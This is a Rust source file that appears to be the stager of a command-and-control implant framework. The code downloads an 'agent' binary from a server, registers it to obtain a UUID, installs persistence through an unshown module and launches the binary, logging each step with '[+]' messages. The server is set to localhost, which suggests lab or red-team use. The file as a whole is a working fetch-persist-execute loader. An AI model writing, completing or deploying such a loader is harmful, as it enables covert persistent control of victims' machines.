use std::process::Command;
use tokio;

static SERVER_URL: &str = "127.0.0.1";
static API_PORT: &str = "8080";
static RT_PORT: &str = "1337";

pub mod network;
pub mod persistence;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let api_url = format!("http://{}:{}", SERVER_URL, API_PORT);

    let mut file_path = match network::get_agent_file(&format!("{}/dist/agent", api_url)).await {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Error: {}", e);
            return Err(e);
        }
    };

    println!("[+] Got agent binary");
    let uuid = match network::register(&format!("{}/agents/register", api_url)).await {
        Ok(id) => id,
        Err(e) => {
            eprintln!("Error: {}", e);
            return Err(e);
        }
    };
    println!("[+] Got UUID");

    let file_path = match persistence::setup(&mut file_path, &uuid) {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Error: {}", e);
            return Err(e);
        }
    };

    println!("[+] Persistence setup complete");
    let child = Command::new(&file_path)
        .spawn()
        .expect("Failed to start process");

    println!("[+] Process started with PID: {}", child.id());

    Ok(())
}
